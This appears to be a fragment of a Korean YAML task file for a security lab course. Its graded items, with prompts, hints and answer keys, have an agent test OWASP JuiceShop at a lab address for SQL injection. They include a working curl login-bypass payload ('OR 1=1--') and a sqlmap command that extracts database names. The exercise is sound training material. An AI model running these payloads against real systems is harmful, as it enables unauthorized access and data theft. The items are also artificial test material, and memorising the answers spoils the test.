+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `verification` 에 적합한 도구: curl/jq 로 PoC 재현 + 결과
+    비교. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: 발견 취약점, 영향, 조치 권고를 포함하세요.
+  category: verification
+  points: 8
+  answer: '🤖 프롬프트: SQL Injection 실습 종합 보고서를 구현 방법을 설명하고 예시 코드를 보여줘
+
+    📎 참고 (CLI): echo ''=== SQL Injection 분석 보고서 ==='' && echo ''대상: http://10.20.30.80''
+    && echo ''발견: SQLi 취약점 (검색 기능)'' && echo ''유형: Error-based, Union-based'' && echo
+    ''영향: 데이터 탈취, 인증 우회'' && echo ''권고: Prepared Statement 적용'' && echo ''=== 보고서
+    완료 ==='''
+  answer_detail: SQLi 분석 보고서는 발견 경로, 재현 방법, 영향 범위, 조치 권고를 포함합니다.
+  verify:
+    type: output_contains
+    expect: 보고서 완료
+    field: stdout
+    semantic:
+      intent: SQLi 실습 종합 리포트 — 탐지·Exploit·추출·방어를 /tmp/sqli_report.txt 로 정리
+      success_criteria:
+      - '[탐지]/[Exploit]/[Extraction]/[방어] 4 섹션 이상'
+      - 발견 취약 파라미터와 Proof-of-Concept
+      - 파일 저장 후 cat 검증
+      acceptable_methods:
+      - heredoc markdown
+      - echo -e 다줄
+      - python 템플릿
+      - json/yaml 구조화
+      negative_signs:
+      - 섹션 2 미만
+      - PoC 누락
+      - 파일 저장 없음
+  target_vm: attacker
+  script: 'echo ''=== SQL Injection 분석 보고서 ==='' && echo ''대상: http://10.20.30.80''
+    && echo ''발견: SQLi 취약점 (검색 기능)'' && echo ''유형: Error-based, Union-based'' && echo
+    ''영향: 데이터 탈취, 인증 우회'' && echo ''권고: Prepared Statement 적용'' && echo ''=== 보고서
+    완료 ==='''
+  risk_level: low
+  bastion_prompt: 'SQL Injection 실습 종합 보고서를 작성하시오.
+
+
+    [도구 권장] verification: curl/jq 로 PoC 재현 + 결과 비교. curl 만 쓰지 말고 **curl/jq 로 PoC 재현
+    + 결과 비교** 등 적합 도구로 호출 후 stdout quote.'
+- order: 99
+  instruction: '[복합 시나리오] "JuiceShop SQLi 점검 — 도구 3종 비교 + 비교 보고서"
+
+
+    ■ 상황 (w01 → w02 시나리오 연속)
+
+
+    당신은 ABC 핀테크 점검팀 신규 컨설턴트. w01 에서 OWASP WSTG-INFO 정찰까지 마쳤고,
+
+    이제 SQLi 점검 단계에 들어왔다. 선배가 한 마디 던진다.
+
+
+    ※ 선배: "신입은 sqlmap 한 줄 돌리고 끝내는데, 우리는 그렇게 못 해.
+
+    ※ 자동 도구는 빠르지만 우회 룰이 박힌 사이트에선 절반은 놓쳐.
+
+    ※ 수동 curl 은 정확하지만 느려. ZAP 프록시는 흐름 캡처에 강하고.
+
+    ※ 세 도구 다 돌려보고 각자 강·약점이 뭔지 표로 만들어 와. 보고서에 쓸 거야."
+
+
+    학습 목표 #1 (도구 차이 이해) + #3 (직접 설치·실행) + #4 (curl 고급) 행동 증명.
+
+
+    ■ 임무 (3 단계, 약 35분)
+
+
+    ▶ Phase A — curl 수동 페이로드 (학습 목표 #4 — curl 고급)
+
+    `curl -s -i -X POST -d "email=admin''%20OR%201=1--&password=x" http://10.20.30.80/rest/user/login`
+    형태로
+
+    1=1 인증 우회를 직접 쏴 본다. -i (헤더), -X POST, --data-urlencode 옵션 시연. 응답 status·body 캡처.
+
+
+    ▶ Phase B — sqlmap 자동 탐지 (학습 목표 #3 — 직접 실행)
+
+    `sqlmap -u "http://10.20.30.80/rest/products/search?q=test" --batch --level=2
+    --risk=2 --dbs` 로
+
+    DB 목록 추출. tables → dump 단계는 시간 비교용으로 첫 페이지만 실행, 소요시간 기록.
+
+
+    ▶ Phase C — 3 도구 비교표 + 권장 흐름
+
+    | 항목 | curl 수동 | sqlmap 자동 | ZAP 프록시 |
+
+    | 탐지 정확도 / 소요시간 / FP / 우회 능력 / 학습 곡선 | ... | ... | ... |
+
+    표 아래에 "1차 정찰: ZAP → 2차 자동: sqlmap → 3차 검증: curl" 식 권장 흐름 1~2줄.
+
+
+    종료 정리: 각 phase 의 핵심 출력 (curl status·sqlmap DB·비교표) 를 한 번에 echo 로 묶어 출력.
+
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `integration_scenario` 에 적합한 도구: 여러 도구 chain —
+    정찰 (whatweb/nmap) → 식별 (sqlmap/xsstrike) → 후속 작업. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로
+    답변에 직접 quote** 해야 채점 통과.'
+  bastion_prompt: '[복합 시나리오 — w02 SQLi 점검 도구 3종 비교]
+
+
+    당신은 ABC 핀테크 점검 컨설턴트. JuiceShop (http://10.20.30.80) 대상 SQLi 점검을
+
+    curl 수동 / sqlmap 자동 / ZAP 프록시 3 도구로 비교 점검해라. 다음 3 phase 를 순서대로 실행:
+
+
+    Phase A (curl 수동, 학습 목표 #4):
+
+    `curl -s -i -X POST --data-urlencode "email=admin'' OR 1=1--" --data-urlencode
+    "password=x"
+
+    http://10.20.30.80/rest/user/login` 실행 후 status code 와 응답 body 첫 줄 캡처.
+
+
+    Phase B (sqlmap 자동, 학습 목표 #3):
+
+    `sqlmap -u "http://10.20.30.80/rest/products/search?q=test" --batch --level=2
+    --risk=2 --dbs`
+
+    실행. DB 목록 + 소요시간 (sqlmap 출력 끝의 [INFO] elapsed) 기록.
+
+
+    Phase C (비교표 + 권장 흐름):
+
+    아래 형식으로 비교표 출력:
+
+    ```
+
+    | 항목 | curl 수동 | sqlmap 자동 | ZAP 프록시 |
+
+    | 탐지정확도 | 높음 | 중 | 중 |
+
+    | 소요시간 | ... | ... | ... |
+
+    | FP | 낮음 | 중 | 낮음 |
+
+    | 우회능력 | 높음 | 중 | 중 |
+
+    ```
+
+    표 끝에 "권장 흐름: ZAP 정찰 → sqlmap 자동 → curl 검증" 한 줄.
+
+
+    종료: echo 로 "=== Phase A status ===" / "=== Phase B DB list ===" / "=== Phase C
+    비교표 ===" 묶어 출력.
+
+
+    반드시 위 3 phase 모두 실행 후 마무리. 중간 종료 금지.
+
+
+    [도구 권장] integration_scenario: 여러 도구 chain — 정찰 (whatweb/nmap) → 식별 (sqlmap/xsstrike)
+    → 후속 작업. curl 만 쓰지 말고 **여러 도구 chain — 정찰 (whatweb/nmap) → 식별 (sqlmap/xsstrike)
+    → 후속 작업** 등 적합 도구로 호출 후 stdout quote.'
+  hint: 'Phase A: curl -i 로 status header 함께 출력. --data-urlencode 가 % 인코딩 자동.
+
+    Phase B: --batch 는 모든 prompt 자동 yes. --dbs 만 첫 단계. tables/dump 는 추가 옵션.
+
+    Phase C: 비교표는 4개 항목 정도면 충분. 권장 흐름 한 줄로 마무리.
+
+    포인트: sqlmap "한 줄로 끝" 이 아니라, 도구마다 강약이 다르다는 점을 표로 시연.
+
+    종료: 3 phase 출력을 echo 묶음으로 한 화면에.
+
+    '
+  category: integration_scenario
+  points: 50
+  verify:
+    type: output_contains
+    expect: 비교표
+    field: stdout
+    semantic:
+      intent: 'JuiceShop SQLi 점검을 curl 수동 / sqlmap 자동 / ZAP 프록시 3 도구로 비교 실행하고,
+
+        도구별 강약점 비교표 + 권장 점검 흐름까지 작성. 학습 목표 #1 (도구 차이) + #3 (직접 실행) +
+
+        #4 (curl 고급) 동시 행동 증명.
+
+        '
+      success_criteria:
+      - Phase A — curl 로 1=1 인증 우회 페이로드 직접 전송, status·body 캡처
+      - Phase B — sqlmap --batch --dbs 로 DB 목록 추출, 소요시간 기록
+      - Phase C — 3 도구 비교표 (4 항목 이상) + 권장 흐름 1~2줄
+      acceptable_methods:
+      - curl -i / -X POST / --data-urlencode 로 SQLi payload
+      - sqlmap --batch --level --risk --dbs
+      - ZAP 자동 스캔 결과 캡처 또는 도구 설명으로 대체 (실 실행 어려우면 비교표만)
+      - markdown table 또는 ASCII table 형식 비교표
+      negative_signs:
+      - sqlmap 한 도구만 실행하고 종료
+      - 비교표 없이 결과만 나열
+      - curl 페이로드를 텍스트 설명만 하고 실행 안 함
+      - 권장 흐름 누락
+  target_vm: attacker
+  risk_level: low
+  answer: '🤖 위 bastion_prompt 그대로 입력. Bastion 이 curl 직접 실행 → sqlmap --batch 실행 → 비교표
+    작성
+
+    3 phase 순차 처리.
+
+    '
+  answer_detail: '학습 목표 #1·#3·#4 통합 검증. sqlmap 한 줄로 끝내는 신입 패턴이 아닌, 도구별 강약점을 표로 정리할
+    수
+
+    있는지 확인. ZAP 은 GUI 라 자동 환경에서는 설명 대체 허용, curl·sqlmap 은 실행 강제. 비교표는
+
+    탐지정확도·소요시간·FP·우회능력 4 축 권장.
+
+    '
+  script: ''
